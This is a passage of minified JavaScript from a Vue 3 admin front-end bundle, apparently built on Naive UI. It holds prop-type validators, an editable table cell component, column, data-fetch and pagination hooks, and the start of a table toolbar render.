    return Ae = Object.assign ? Object.assign.bind() : function(e) {
        for (var t = 1; t < arguments.length; t++) {
            var n = arguments[t];
            for (var o in n) Object.prototype.hasOwnProperty.call(n, o) && (e[o] = n[o])
        }
        return e
    }, Ae.apply(this, arguments)
}

function vn(e, t) {
    if (e == null) return {};
    var n, o, r = {},
        a = Object.keys(e);
    for (o = 0; o < a.length; o++) t.indexOf(n = a[o]) >= 0 || (r[n] = e[n]);
    return r
}
const ss = {
        silent: !1,
        logLevel: "warn"
    },
    is = ["validator"],
    hn = Object.prototype,
    yn = hn.toString,
    ls = hn.hasOwnProperty,
    bn = /^\s*function (\w+)/;

function $t(e) {
    var t;
    const n = (t = e == null ? void 0 : e.type) !== null && t !== void 0 ? t : e;
    if (n) {
        const o = n.toString().match(bn);
        return o ? o[1] : ""
    }
    return ""
}
const be = rs,
    us = e => e;
let J = us;
const ke = (e, t) => ls.call(e, t),
    cs = Number.isInteger || function(e) {
        return typeof e == "number" && isFinite(e) && Math.floor(e) === e
    },
    Se = Array.isArray || function(e) {
        return yn.call(e) === "[object Array]"
    },
    Te = e => yn.call(e) === "[object Function]",
    Ke = e => be(e) && ke(e, "_vueTypes_name"),
    _n = e => be(e) && (ke(e, "type") || ["_vueTypes_name", "validator", "default", "required"].some(t => ke(e, t)));

function ut(e, t) {
    return Object.defineProperty(e.bind(t), "__original", {
        value: e
    })
}

function _e(e, t, n = !1) {
    let o, r = !0,
        a = "";
    o = be(e) ? e : {
        type: e
    };
    const s = Ke(o) ? o._vueTypes_name + " - " : "";
    if (_n(o) && o.type !== null) {
        if (o.type === void 0 || o.type === !0 || !o.required && t === void 0) return r;
        Se(o.type) ? (r = o.type.some(l => _e(l, t, !0) === !0), a = o.type.map(l => $t(l)).join(" or ")) : (a = $t(o), r = a === "Array" ? Se(t) : a === "Object" ? be(t) : a === "String" || a === "Number" || a === "Boolean" || a === "Function" ? function(l) {
            if (l == null) return "";
            const i = l.constructor.toString().match(bn);
            return i ? i[1] : ""
        }(t) === a : t instanceof o.type)
    }
    if (!r) {
        const l = `${s}value "${t}" should be of type "${a}"`;
        return n === !1 ? (J(l), !1) : l
    }
    if (ke(o, "validator") && Te(o.validator)) {
        const l = J,
            i = [];
        if (J = c => {
                i.push(c)
            }, r = o.validator(t), J = l, !r) {
            const c = (i.length > 1 ? "* " : "") + i.join(`
* `);
            return i.length = 0, n === !1 ? (J(c), r) : c
        }
    }
    return r
}

function te(e, t) {
    const n = Object.defineProperties(t, {
            _vueTypes_name: {
                value: e,
                writable: !0
            },
            isRequired: {
                get() {
                    return this.required = !0, this
                }
            },
            def: {
                value(r) {
                    return r === void 0 ? (ke(this, "default") && delete this.default, this) : Te(r) || _e(this, r, !0) === !0 ? (this.default = Se(r) ? () => [...r] : be(r) ? () => Object.assign({}, r) : r, this) : (J(`${this._vueTypes_name} - invalid default value: "${r}"`), this)
                }
            }
        }),
        {
            validator: o
        } = n;
    return Te(o) && (n.validator = ut(o, n)), n
}

function ie(e, t) {
    const n = te(e, t);
    return Object.defineProperty(n, "validate", {
        value(o) {
            return Te(this.validator) && J(`${this._vueTypes_name} - calling .validate() will overwrite the current custom validator function. Validator info:
${JSON.stringify(this)}`), this.validator = ut(o, this), this
        }
    })
}

function Pt(e, t, n) {
    const o = function(i) {
        const c = {};
        return Object.getOwnPropertyNames(i).forEach(_ => {
            c[_] = Object.getOwnPropertyDescriptor(i, _)
        }), Object.defineProperties({}, c)
    }(t);
    if (o._vueTypes_name = e, !be(n)) return o;
    const {
        validator: r
    } = n, a = vn(n, is);
    if (Te(r)) {
        let {
            validator: i
        } = o;
        i && (i = (l = (s = i).__original) !== null && l !== void 0 ? l : s), o.validator = ut(i ? function(c) {
            return i.call(this, c) && r.call(this, c)
        } : r, o)
    }
    var s, l;
    return Object.assign(o, a)
}

function Qe(e) {
    return e.replace(/^(?!\s*$)/gm, "  ")
}
const ds = () => ie("any", {}),
    fs = () => ie("function", {
        type: Function
    }),
    ps = () => ie("boolean", {
        type: Boolean
    }),
    gs = () => ie("string", {
        type: String
    }),
    ms = () => ie("number", {
        type: Number
    }),
    vs = () => ie("array", {
        type: Array
    }),
    hs = () => ie("object", {
        type: Object
    }),
    ys = () => te("integer", {
        type: Number,
        validator: e => cs(e)
    }),
    bs = () => te("symbol", {
        validator: e => typeof e == "symbol"
    });

function _s(e, t = "custom validation failed") {
    if (typeof e != "function") throw new TypeError("[VueTypes error]: You must provide a function as argument");
    return te(e.name || "<<anonymous function>>", {
        type: null,
        validator(n) {
            const o = e(n);
            return o || J(`${this._vueTypes_name} - ${t}`), o
        }
    })
}

function ws(e) {
    if (!Se(e)) throw new TypeError("[VueTypes error]: You must provide an array as argument.");
    const t = `oneOf - value should be one of "${e.join('", "')}".`,
        n = e.reduce((o, r) => {
            if (r != null) {
                const a = r.constructor;
                o.indexOf(a) === -1 && o.push(a)
            }
            return o
        }, []);
    return te("oneOf", {
        type: n.length > 0 ? n : void 0,
        validator(o) {
            const r = e.indexOf(o) !== -1;
            return r || J(t), r
        }
    })
}

function Cs(e) {
    if (!Se(e)) throw new TypeError("[VueTypes error]: You must provide an array as argument");
    let t = !1,
        n = [];
    for (let r = 0; r < e.length; r += 1) {
        const a = e[r];
        if (_n(a)) {
            if (Ke(a) && a._vueTypes_name === "oneOf" && a.type) {
                n = n.concat(a.type);
                continue
            }
            if (Te(a.validator) && (t = !0), a.type === !0 || !a.type) {
                J('oneOfType - invalid usage of "true" or "null" as types.');
                continue
            }
            n = n.concat(a.type)
        } else n.push(a)
    }
    n = n.filter((r, a) => n.indexOf(r) === a);
    const o = n.length > 0 ? n : null;
    return te("oneOfType", t ? {
        type: o,
        validator(r) {
            const a = [],
                s = e.some(l => {
                    const i = _e(Ke(l) && l._vueTypes_name === "oneOf" ? l.type || null : l, r, !0);
                    return typeof i == "string" && a.push(i), i === !0
                });
            return s || J(`oneOfType - provided value does not match any of the ${a.length} passed-in validators:
${Qe(a.join(`
`))}`), s
        }
    } : {
        type: o
    })
}

function Os(e) {
    return te("arrayOf", {
        type: Array,
        validator(t) {
            let n = "";
            const o = t.every(r => (n = _e(e, r, !0), n === !0));
            return o || J(`arrayOf - value validation error:
${Qe(n)}`), o
        }
    })
}

function ks(e) {
    return te("instanceOf", {
        type: e
    })
}

function Ss(e) {
    return te("objectOf", {
        type: Object,
        validator(t) {
            let n = "";
            const o = Object.keys(t).every(r => (n = _e(e, t[r], !0), n === !0));
            return o || J(`objectOf - value validation error:
${Qe(n)}`), o
        }
    })
}

function Ts(e) {
    const t = Object.keys(e),
        n = t.filter(r => {
            var a;
            return !((a = e[r]) === null || a === void 0 || !a.required)
        }),
        o = te("shape", {
            type: Object,
            validator(r) {
                if (!be(r)) return !1;
                const a = Object.keys(r);
                if (n.length > 0 && n.some(s => a.indexOf(s) === -1)) {
                    const s = n.filter(l => a.indexOf(l) === -1);
                    return J(s.length === 1 ? `shape - required property "${s[0]}" is not defined.` : `shape - required properties "${s.join('", "')}" are not defined.`), !1
                }
                return a.every(s => {
                    if (t.indexOf(s) === -1) return this._vueTypes_isLoose === !0 || (J(`shape - shape definition does not include a "${s}" property. Allowed keys: "${t.join('", "')}".`), !1);
                    const l = _e(e[s], r[s], !0);
                    return typeof l == "string" && J(`shape - "${s}" property validation error:
 ${Qe(l)}`), l === !0
                })
            }
        });
    return Object.defineProperty(o, "_vueTypes_isLoose", {
        writable: !0,
        value: !1
    }), Object.defineProperty(o, "loose", {
        get() {
            return this._vueTypes_isLoose = !0, this
        }
    }), o
}
const $s = ["name", "validate", "getter"],
    Ps = (() => {
        var e;
        return (e = class {
            static get any() {
                return ds()
            }
            static get func() {
                return fs().def(this.defaults.func)
            }
            static get bool() {
                return ps().def(this.defaults.bool)
            }
            static get string() {
                return gs().def(this.defaults.string)
            }
            static get number() {
                return ms().def(this.defaults.number)
            }
            static get array() {
                return vs().def(this.defaults.array)
            }
            static get object() {
                return hs().def(this.defaults.object)
            }
            static get integer() {
                return ys().def(this.defaults.integer)
            }
            static get symbol() {
                return bs()
            }
            static get nullable() {
                return {
                    type: null
                }
            }
            static extend(t) {
                if (Se(t)) return t.forEach(i => this.extend(i)), this;
                const {
                    name: n,
                    validate: o = !1,
                    getter: r = !1
                } = t, a = vn(t, $s);
                if (ke(this, n)) throw new TypeError(`[VueTypes error]: Type "${n}" already defined`);
                const {
                    type: s
                } = a;
                if (Ke(s)) return delete a.type, Object.defineProperty(this, n, r ? {
                    get: () => Pt(n, s, a)
                } : {
                    value(...i) {
                        const c = Pt(n, s, a);
                        return c.validator && (c.validator = c.validator.bind(c, ...i)), c
                    }
                });
                let l;
                return l = r ? {
                    get() {
                        const i = Object.assign({}, a);
                        return o ? ie(n, i) : te(n, i)
                    },
                    enumerable: !0
                } : {
                    value(...i) {
                        const c = Object.assign({}, a);
                        let _;
                        return _ = o ? ie(n, c) : te(n, c), c.validator && (_.validator = c.validator.bind(_, ...i)), _
                    },
                    enumerable: !0
                }, Object.defineProperty(this, n, l)
            }
        }).defaults = {}, e.sensibleDefaults = void 0, e.config = ss, e.custom = _s, e.oneOf = ws, e.instanceOf = ks, e.oneOfType = Cs, e.arrayOf = Os, e.objectOf = Ss, e.shape = Ts, e.utils = {
            validate: (t, n) => _e(n, t, !0) === !0,
            toType: (t, n, o = !1) => o ? ie(t, n) : te(t, n)
        }, e
    })();

function wn(e = {
    func: () => {},
    bool: !0,
    string: "",
    number: 0,
    array: () => [],
    object: () => ({}),
    integer: 0
}) {
    var t;
    return (t = class extends Ps {
        static get sensibleDefaults() {
            return Ae({}, this.defaults)
        }
        static set sensibleDefaults(n) {
            this.defaults = n !== !1 ? Ae({}, n !== !0 ? n : e) : {}
        }
    }).defaults = Ae({}, e), t
}
class Pi extends wn() {}
const de = wn({
    func: void 0,
    bool: void 0,
    string: void 0,
    number: void 0,
    object: void 0,
    integer: void 0
});
de.extend([{
    name: "style",
    getter: !0,
    type: [String, Object],
    default: void 0
}, {
    name: "VNodeChild",
    getter: !0,
    type: void 0
}]);

function Nt(e) {
    return e === "NInput" ? "请输入" : ["NPicker", "NSelect", "NCheckbox", "NRadio", "NSwitch", "NDatePicker", "NTimePicker"].includes(e) ? "请选择" : ""
}
const Ns = re({
        name: "EditableCell",
        components: {
            FormOutlined: dn,
            CloseOutlined: So,
            CheckOutlined: To,
            CellComponent: ts
        },
        directives: {
            clickOutside: as
        },
        props: {
            value: {
                type: [String, Number, Boolean, Object],
                default: ""
            },
            record: {
                type: Object
            },
            column: {
                type: Object,
                default: () => ({})
            },
            index: de.number
        },
        setup(e) {
            const t = gn(),
                n = F(!1),
                o = F(),
                r = F(!1),
                a = F(""),
                s = F([]),
                l = F(e.value),
                i = F(e.value),
                c = z(() => {
                    var m;
                    return ((m = e.column) == null ? void 0 : m.editComponent) || "NInput"
                }),
                _ = z(() => {
                    var m;
                    return (m = e.column) == null ? void 0 : m.editRule
                }),
                P = z(() => u(a) && u(r)),
                j = z(() => {
                    const m = u(c);
                    return ["NCheckbox", "NRadio"].includes(m)
                }),
                p = z(() => {
                    var M, Y, H, pe;
                    const m = (Y = (M = e.column) == null ? void 0 : M.editComponentProps) != null ? Y : {},
                        T = (pe = (H = e.column) == null ? void 0 : H.editComponent) != null ? pe : null,
                        N = u(c),
                        I = {},
                        d = u(j);
                    let b = d ? "checked" : "value";
                    const C = u(l);
                    let $ = d ? Be(C) && ee(C) ? C : !!C : C;
                    N === "NDatePicker" && (Ye($) ? m.valueFormat ? b = "formatted-value" : $ = Ct($).getTime() : me($) && (m.valueFormat ? b = "formatted-value" : $ = $.map(D => Ct(D).getTime())));
                    const B = T ? mn[T] : void 0;
                    return le(E(E({
                        placeholder: Nt(u(c))
                    }, I), tr(m, "onChange")), {
                        [B]: O,
                        [b]: $
                    })
                }),
                v = z(() => {
                    var C, $;
                    const {
                        editComponentProps: m,
                        editValueMap: T
                    } = e.column, N = u(l);
                    if (T && fe(T)) return T(N);
                    if (!u(c).includes("NSelect")) return N;
                    const b = ((C = m == null ? void 0 : m.options) != null ? C : u(s) || []).find(B => `${B.value}` == `${N}`);
                    return ($ = b == null ? void 0 : b.label) != null ? $ : N
                }),
                g = z(() => {
                    const {
                        align: m = "center"
                    } = e.column;
                    return `edit-cell-align-${m}`
                }),
                f = z(() => {
                    const {
                        editable: m
                    } = e.record || {};
                    return !!m
                });
            Ge(() => {
                i.value = e.value
            }), Ge(() => {
                const {
                    editable: m
                } = e.column;
                (ee(m) || ee(u(f))) && (n.value = !!m || u(f))
            });

            function h() {
                var m;
                u(f) || u((m = e.column) == null ? void 0 : m.editRow) || (a.value = "", n.value = !0, Ze(() => {
                    var N;
                    const T = u(o);
                    (N = T == null ? void 0 : T.focus) == null || N.call(T)
                }))
            }

            function O(T) {
                return L(this, arguments, function*(m) {
                    var b, C, $, B, M;
                    const N = u(c),
                        I = (C = (b = e.column) == null ? void 0 : b.editComponentProps) != null ? C : {};
                    m ? m != null && m.target && Reflect.has(m.target, "value") ? l.value = m.target.value : N === "NCheckbox" ? l.value = m.target.checked : (Ye(m) || ee(m) || Be(m)) && (l.value = m) : l.value = m, N === "NDatePicker" && (Be(l.value) ? I.valueFormat && (l.value = pt(l.value, I.valueFormat)) : me(l.value) && I.valueFormat && (l.value = l.value.map(Y => {
                        pt(Y, I.valueFormat)
                    })));
                    const d = (B = ($ = e.column) == null ? void 0 : $.editComponentProps) == null ? void 0 : B.onChange;
                    d && fe(d) && d(...arguments), (M = t.emit) == null || M.call(t, "edit-change", {
                        column: e.column,
                        value: u(l),
                        record: ye(e.record)
                    }), yield S()
                })
            }

            function S() {
                return L(this, null, function*() {
                    const {
                        column: m,
                        record: T
                    } = e, {
                        editRule: N
                    } = m, I = u(l);
                    if (N) {
                        if (ee(N) && !I && !Be(I)) {
                            r.value = !0;
                            const d = u(c);
                            return a.value = Nt(d), !1
                        }
                        if (fe(N)) {
                            const d = yield N(I, T);
                            return d ? (a.value = d, r.value = !0, !1) : (a.value = "", !0)
                        }
                    }
                    return a.value = "", !0
                })
            }

            function U(m = !0, T = !0) {
                return L(this, null, function*() {
                    var B;
                    if (T && !(yield S())) return !1;
                    const {
                        column: N,
                        index: I,
                        record: d
                    } = e;
                    if (!d) return !1;
                    const {
                        key: b
                    } = N, C = u(l);
                    if (!b) return;
                    un(d, b, C), m && ((B = t.emit) == null || B.call(t, "edit-end", {
                        record: d,
                        index: I,
                        key: b,
                        value: C
                    })), n.value = !1
                })
            }

            function k() {
                return L(this, null, function*() {
                    var m;
                    (m = e.column) != null && m.editRow || (yield U())
                })
            }

            function R() {
                var d;
                n.value = !1, l.value = i.value;
                const {
                    column: m,
                    index: T,
                    record: N
                } = e, {
                    key: I
                } = m;
                r.value = !0, a.value = "", (d = t.emit) == null || d.call(t, "edit-cancel", {
                    record: N,
                    index: T,
                    key: I,
                    value: u(l)
                })
            }

            function Z() {
                var T;
                if ((T = e.column) != null && T.editable || u(f)) return;
                u(c).includes("NInput") && R()
            }

            function se(m) {
                s.value = m
            }

            function Q(m, T) {
                var N;
                e.record && (me(e.record[m]) ? (N = e.record[m]) == null || N.push(T) : e.record[m] = [T])
            }
            return e.record && (Q("submitCbs", U), Q("validCbs", S), Q("cancelCbs", R), e.column.key && (e.record.editValueRefs || (e.record.editValueRefs = {}), e.record.editValueRefs[e.column.key] = l), e.record.onCancelEdit = () => {
                var m, T;
                me((m = e.record) == null ? void 0 : m.cancelCbs) && ((T = e.record) == null || T.cancelCbs.forEach(N => N()))
            }, e.record.onSubmitEdit = () => L(this, null, function*() {
                var m, T, N, I;
                if (me((m = e.record) == null ? void 0 : m.submitCbs)) {
                    const d = (((T = e.record) == null ? void 0 : T.validCbs) || []).map(B => B());
                    return (yield Promise.all(d)).every(B => !!B) ? ((((N = e.record) == null ? void 0 : N.submitCbs) || []).forEach(B => B(!1, !1)), (I = t.emit) == null || I.call(t, "edit-row-end"), !0) : void 0
                }
            })), {
                isEdit: n,
                handleEdit: h,
                currentValueRef: l,
                handleSubmit: U,
                handleChange: O,
                handleCancel: R,
                elRef: o,
                getComponent: c,
                getRule: _,
                onClickOutside: Z,
                ruleMessage: a,
                getRuleVisible: P,
                getComponentProps: p,
                handleOptionsChange: se,
                getWrapperClass: g,
                getRowEditable: f,
                getValues: v,
                handleEnter: k
            }
        }
    }),
    Fs = {
        class: "editable-cell"
    },
    Es = {
        key: 0,
        class: "flex editable-cell-content"
    },
    js = {
        class: "editable-cell-content-comp"
    },
    Ds = {
        key: 0,
        class: "editable-cell-action"
    };

function xs(e, t, n, o, r, a) {
    const s = ae("CellComponent"),
        l = ae("CheckOutlined"),
        i = ze,
        c = ae("CloseOutlined"),
        _ = ae("FormOutlined"),
        P = oo("click-outside");
    return x(), G("div", Fs, [e.isEdit ? ao((x(), G("div", Es, [A("div", js, [w(s, he(e.getComponentProps, {
        component: e.getComponent,
        popoverVisible: e.getRuleVisible,
        ruleMessage: e.ruleMessage,
        rule: e.getRule,
        class: e.getWrapperClass,
        ref: "elRef",
        onOptionsChange: e.handleOptionsChange,
        onPressEnter: e.handleEnter
    }), null, 16, ["component", "popoverVisible", "ruleMessage", "rule", "class", "onOptionsChange", "onPressEnter"])]), e.getRowEditable ? ce("", !0) : (x(), G("div", Ds, [w(i, {
        class: "mx-2 cursor-pointer",
        title: "保存"
    }, {
        default: y(() => [w(l, {
            onClick: e.handleSubmit
        }, null, 8, ["onClick"])]),
        _: 1
    }), w(i, {
        class: "mx-2 cursor-pointer",
        title: "取消"
    }, {
        default: y(() => [w(c, {
            onClick: e.handleCancel
        }, null, 8, ["onClick"])]),
        _: 1
    })]))])), [
        [P, e.onClickOutside]
    ]) : (x(), G("div", {
        key: 1,
        class: "flex items-center editable-cell-content",
        onClick: t[0] || (t[0] = (...j) => e.handleEdit && e.handleEdit(...j))
    }, [X(ue(e.getValues) + " ", 1), e.column.editRow ? ce("", !0) : (x(), K(i, {
        key: 0,
        class: "ml-1 edit-icon"
    }, {
        default: y(() => [w(_)]),
        _: 1
    }))]))])
}
const As = Le(Ns, [
    ["render", xs]
]);

function Rs(e) {
    return (t, n) => {
        const o = e.key,
            r = t[o];
        return t.onEdit = (a, s = !1) => L(this, null, function*() {
            var l, i;
            return s || (t.editable = a), !a && s ? (yield(l = t.onSubmitEdit) == null ? void 0 : l.call(t)) ? (t.editable = !1, !0) : !1 : (!a && !s && ((i = t.onCancelEdit) == null || i.call(t)), !0)
        }), q(As, {
            value: r,
            record: t,
            column: e,
            index: n
        })
    }
}

function Ls(e) {
    const t = F(u(e).columns);
    let n = u(e).columns;
    const o = z(() => {
            const p = xe(u(t));
            return i(e, p), p || []
        }),
        {
            hasPermission: r
        } = ro();

    function a(p) {
        const v = p.ifShow;
        let g = !0;
        return ee(v) && (g = v), fe(v) && (g = v(p)), g
    }
    const s = (p, v) => q(Je, null, {
            trigger: () => p,
            default: () => v
        }),
        l = z(() => {
            const p = u(o);
            return xe(p).filter(g => r(g.auth) && a(g)).map(g => {
                g.ellipsis = typeof g.ellipsis == "undefined" ? {
                    tooltip: !0
                } : !1;
                const {
                    edit: f
                } = g;
                if (f && (g.render = Rs(g), f)) {
                    const h = g.title;
                    g.title = () => s(q("div", {
                        class: "flex items-center"
                    }, [q("span", {
                        style: {
                            "margin-right": "5px"
                        }
                    }, h), q(ze, {
                        size: 14
                    }, {
                        default: () => q(dn)
                    })]), "该列可编辑")
                }
                return g
            })
        });
    $e(() => u(e).columns, p => {
        t.value = p, n = p
    });

    function i(p, v) {
        const {
            actionColumn: g
        } = u(p);
        g && !v.find(f => f.key === "action") && v.push(E({}, g))
    }

    function c(p) {
        const v = xe(p);
        if (!me(v)) return;
        if (!v.length) {
            t.value = [];
            return
        }
        const g = n.map(f => f.key);
        if (!Ye(v[0])) t.value = v;
        else {
            const f = [];
            n.forEach(h => {
                p.includes(h.key) && f.push(E({}, h))
            }), Ka(g, v) || f.sort((h, O) => g.indexOf(h.key) - g.indexOf(O.key)), t.value = f
        }
    }

    function _() {
        return ye(u(o)).map(v => le(E({}, v), {
            title: v.title,
            key: v.key,
            fixed: v.fixed || void 0
        }))
    }

    function P(p) {
        return p ? n.map(v => v.key) : n
    }

    function j(p, v) {
        !p || !v || n.forEach(g => {
            if (g.key === p) {
                Object.assign(g, v);
                return
            }
        })
    }
    return {
        getColumnsRef: o,
        getCacheColumns: P,
        setCacheColumnsField: j,
        setColumns: c,
        getColumns: _,
        getPageColumns: l
    }
}
const zs = {
        table: {
            apiSetting: {
                pageField: "page",
                sizeField: "pageSize",
                listField: "data",
                totalField: "pageCount",
                countField: "total"
            },
            defaultPageSize: 50,
            pageSizes: [50, 100, 200, 500, 1e3]
        },
        upload: {
            apiSetting: {
                infoField: "data",
                imgField: "photo"
            },
            maxSize: 2,
            fileType: ["image/png", "image/jpg", "image/jpeg", "image/gif", "image/svg+xml"]
        }
    },
    {
        table: Is
    } = zs,
    {
        apiSetting: Bs,
        defaultPageSize: Vs,
        pageSizes: Us
    } = Is,
    Ms = Vs,
    Ee = Bs,
    Hs = Us;

function Ws(e, {
    getPaginationInfo: t,
    setPagination: n,
    setLoading: o,
    tableData: r
}, a) {
    const s = F([]);
    Ge(() => {
        r.value = u(s)
    }), $e(() => u(e).dataSource, () => {
        const {
            dataSource: p
        } = u(e);
        p && (s.value = p)
    }, {
        immediate: !0
    });
    const l = z(() => {
            const {
                rowKey: p
            } = u(e);
            return p || (() => "key")
        }),
        i = z(() => {
            const p = u(s);
            return !p || p.length === 0 ? u(s) : u(s)
        });

    function c(p) {
        return L(this, null, function*() {
            try {
                o(!0);
                const {
                    request: v,
                    pagination: g,
                    beforeRequest: f,
                    afterRequest: h
                } = u(e);
                if (!v) return;
                const O = Ee.pageField,
                    S = Ee.sizeField,
                    U = Ee.totalField,
                    k = Ee.listField,
                    R = Ee.countField;
                let Z = {};
                const {
                    page: se = 1,
                    pageSize: Q = 10
                } = u(t);
                ee(g) && !g || ee(t) ? Z = {} : (Z[O] = p && p[O] || se, Z[S] = Q);
                let m = E(E({}, Z), p);
                f && fe(f) && (m = (yield f(m)) || m);
                const T = yield v(m), N = T[U], I = T[O], d = T[R], b = T[k] ? T[k] : [];
                if (N) {
                    const $ = Math.ceil(d / Q);
                    if (se > $) return n({
                        page: $,
                        itemCount: d
                    }), yield c(p)
                }
                let C = T[k] ? T[k] : [];
                h && fe(h) && (C = (yield h(C)) || C), s.value = C, n({
                    page: I,
                    pageCount: N,
                    itemCount: d
                }), p && p[O] && n({
                    page: p[O] || 1
                }), a("fetch-success", {
                    items: u(C),
                    resultTotal: N
                })
            } catch (v) {
                console.error(v), a("fetch-error", v), s.value = [], n({
                    pageCount: 0
                })
            } finally {
                o(!1)
            }
        })
    }
    Ie(() => {
        setTimeout(() => {
            c()
        }, 16)
    });

    function _(p) {
        s.value = p
    }

    function P() {
        return i.value
    }

    function j(p) {
        return L(this, null, function*() {
            yield c(p)
        })
    }
    return {
        fetch: c,
        getRowKey: l,
        getDataSourceRef: i,
        getDataSource: P,
        setTableData: _,
        reload: j
    }
}

function qs(e) {
    const t = F({}),
        n = F(!0);
    $e(() => u(e).pagination, i => {
        !ee(i) && i && (t.value = E(E({}, u(t)), i != null ? i : {}))
    });
    const o = z(() => {
        const {
            pagination: i
        } = u(e);
        return !u(n) || ee(i) && !i ? !1 : E(E({
            page: 1,
            pageSize: Ms,
            pageSizes: Hs,
            showSizePicker: !0,
            showQuickJumper: !0,
            prefix: c => `共 ${c.itemCount} 条`
        }, ee(i) ? {} : i), u(t))
    });

    function r(i) {
        const c = u(o);
        t.value = E(E({}, ee(c) ? {} : c), i)
    }

    function a() {
        return u(o)
    }

    function s() {
        return u(n)
    }

    function l(i) {
        return L(this, null, function*() {
            n.value = i
        })
    }
    return {
        getPagination: a,
        getPaginationInfo: o,
        setShowPagination: l,
        getShowPagination: s,
        setPagination: r
    }
}
const Gs = le(E({}, Zt.props), {
    title: {
        type: String,
        default: null
    },
    titleTooltip: {
        type: String,
        default: null
    },
    size: {
        type: String,
        default: "medium"
    },
    dataSource: {
        type: [Object],
        default: () => []
    },
    columns: {
        type: [Array],
        default: () => [],
        required: !0
    },
    beforeRequest: {
        type: Function,
        default: null
    },
    request: {
        type: Function,
        default: null
    },
    afterRequest: {
        type: Function,
        default: null
    },
    rowKey: {
        type: [String, Function],
        default: void 0
    },
    pagination: {
        type: [Object, Boolean],
        default: () => {}
    },
    showPagination: {
        type: [String, Boolean],
        default: "auto"
    },
    actionColumn: {
        type: Object,
        default: null
    },
    canResize: de.bool.def(!0),
    resizeHeightOffset: de.number.def(0),
    striped: de.bool.def(!1)
});
var Ft;
const Ys = typeof window != "undefined",
    Et = () => {};
Ys && ((Ft = window == null ? void 0 : window.navigator) != null && Ft.userAgent) && /iP(ad|hone|od)/.test(window.navigator.userAgent);

function jt(e) {
    return typeof e == "function" ? e() : u(e)
}

function Ks(e, t) {
    function n(...o) {
        return new Promise((r, a) => {
            Promise.resolve(e(() => t.apply(this, o), {
                fn: t,
                thisArg: this,
                args: o
            })).then(r).catch(a)
        })
    }
    return n
}

function Js(e, t = {}) {
    let n, o, r = Et;
    const a = l => {
        clearTimeout(l), r(), r = Et
    };
    return l => {
        const i = jt(e),
            c = jt(t.maxWait);
        return n && a(n), i <= 0 || c !== void 0 && c <= 0 ? (o && (a(o), o = null), Promise.resolve(l())) : new Promise((_, P) => {
            r = t.rejectOnCancel ? P : _, c && !o && (o = setTimeout(() => {
                n && a(n), o = null, _(l())
            }, c)), n = setTimeout(() => {
                o && a(o), o = null, _(l())
            }, i)
        })
    }
}

function Zs(e, t = 200, n = {}) {
    return Ks(Js(t, n), e)
}

function Qs(e, t = !0) {
    Qt() ? Ie(e) : t ? e() : Ze(e)
}

function Xs(e) {
    Qt() && Xt(e)
}

function ei(e, t = 150, n) {
    let o = () => {
        e()
    };
    o = Zs(o, t);
    const a = () => {
            window.addEventListener("resize", o)
        },
        s = () => {
            window.removeEventListener("resize", o)
        };
    return Qs(() => {
        a()
    }), Xs(() => {
        s()
    }), [a, s]
}
const ti = {
        class: "table-toolbar"
    },
    ni = {
        class: "flex items-center table-toolbar-left"
    },
    oi = {
        key: 0,
        class: "table-toolbar-left-title"
    },
    ai = {
        class: "flex items-center leading-none table-toolbar-right"
    },
    ri = {
        class: "mr-2 table-toolbar-right-icon"
    },
    si = {
        class: "table-toolbar-right-icon"
    },
    ii = {
        class: "s-table"
    },
    li = re({
        __name: "Table",
        props: E({}, Gs),
        emits: ["fetch-success", "fetch-error", "update:checked-row-keys", "edit-end", "edit-cancel", "edit-row-end", "edit-change"],
        setup(e, {
            expose: t,
            emit: n
        }) {
            const o = [{
                    type: "menu",
                    label: "紧凑",
                    key: "small"
                }, {
                    type: "menu",
                    label: "默认",
                    key: "medium"
                }, {
                    type: "menu",
                    label: "宽松",
                    key: "large"
                }],
                r = n,
                a = e,
                s = F(150),
                l = F(null),
                i = F(null);
            let c;
            const _ = F(a.striped || !1),
                P = F([]),
                j = F(),
                p = z(() => E(E({}, a), u(j))),
                v = F(u(p).size || "medium"),
                {
                    getLoading: g,
                    setLoading: f
                } = es(p),
                {
                    getPaginationInfo: h,
                    setPagination: O
                } = qs(p),
                {
                    getDataSourceRef: S,
                    getDataSource: U,
                    getRowKey: k,
                    reload: R
                } = Ws(p, {
                    getPaginationInfo: h,
                    setPagination: O,
                    tableData: P,
                    setLoading: f
                }, r),
                {
                    getPageColumns: Z,
                    setColumns: se,
                    getColumns: Q,
                    getCacheColumns: m,
                    setCacheColumnsField: T
                } = Ls(p);

            function N(D) {
                O({
                    page: D
                }), R()
            }

            function I(D) {
                O({
                    page: 1,
                    pageSize: D
                }), R()
            }

            function d(D) {
                v.value = D
            }
            const b = z(() => v.value),
                C = z(() => {
                    const D = u(S),
                        W = D.length ? `${u(s)}px` : "auto";
                    return le(E({}, u(p)), {
                        loading: u(g),
                        columns: ye(u(Z)),
                        rowKey: u(k),
                        data: D,
                        size: u(b),
                        remote: !0,
                        "max-height": W,
                        title: ""
                    })
                }),
                $ = z(() => ye(u(h)));

            function B(D) {
                j.value = E(E({}, u(j)), D)
            }
            const M = D => _.value = D,
                Y = {
                    reload: R,
                    setColumns: se,
                    setLoading: f,
                    setProps: B,
                    getColumns: Q,
                    getDataSource: U,
                    getPageColumns: Z,
                    getCacheColumns: m,
                    setCacheColumnsField: T,
                    emit: r
                },
                H = z(() => {
                    const {
                        canResize: D
                    } = u(p);
                    return D
                });

            function pe() {
                return L(this, null, function*() {
                    const D = u(l);
                    if (!D || !u(H)) return;
                    const W = D == null ? void 0 : D.$el,
                        Pe = W.querySelector(".n-data-table-thead "),
                        {
                            bottomIncludeBody: we
                        } = os(Pe),
                        Xe = 64;
                    let Ne = 2,
                        et = 24;
                    if (!ee(u($)))
                        if (c = W.querySelector(".n-data-table__pagination"), c) {
                            const tt = c.offsetHeight;
                            Ne += tt || 0
                        } else Ne += 28;
                    let Ce = we - (Xe + Ne + et + (a.resizeHeightOffset || 0));
                    const ne = a.maxHeight;
                    Ce = ne && ne < Ce ? ne : Ce, s.value = Ce
                })
            }
            return ei(pe, 280), Ie(() => {
                Ze(() => {
                    pe()
                })
            }), qr(le(E({}, Y), {
                wrapRef: i,
                getBindValues: C
            })), t(Y), (D, W) => {
                const Pe = ze,
                    we = Je,
                    Xe = Jt,
                    Ne = qt,
                    et = so,
                    Ce = Zt;
                return x(), G(Me, null, [A("div", ti, [A("div", ni, [a.title ? (x(), G("div", oi, [X(ue(a.title) + " ", 1), a.titleTooltip ? (x(), K(we, {
                    key: 0,
                    trigger: "hover"
                }, {
                    trigger: y(() => [w(Pe, {
                        size: "18",
                        class: "ml-1 text-gray-400 cursor-pointer"
                    }, {
